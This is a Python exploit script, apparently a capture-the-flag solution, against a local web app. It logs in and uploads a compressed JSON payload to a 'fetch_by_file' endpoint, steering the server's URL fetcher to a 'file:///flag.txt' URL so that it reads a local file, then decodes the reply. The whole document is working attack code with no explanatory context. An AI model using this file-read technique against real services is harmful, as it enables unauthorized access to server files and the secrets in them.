import base64
import gzip
import json
import sys
import zlib
import requests

base_url = f'http://localhost:13000'
ses = requests.session()
ses.post(f'{base_url}/auth/register', data={'username': 'aw', 'password': 'aw'})
ses.post(f'{base_url}/auth/login', data={'username': 'aw', 'password': 'aw'})
provider = {b"\x00\x00": "wget", b"\x00\x01": "curl", b"\x00\x02": "python"}
provider = {v: k for k, v in provider.items()}
data = {
    "provider": "python",
    "url": " file:///flag.txt"
    }
payload = provider[data['provider']] + \
    gzip.compress(zlib.compress(json.dumps(data).encode()))
req = ses.post(f'{base_url}/dashboard/fetch_by_file',

files={'fetch_file': payload, 'file': payload})

try:
    res = req.text
    print(base64.b64decode(res).decode())
except:
    pass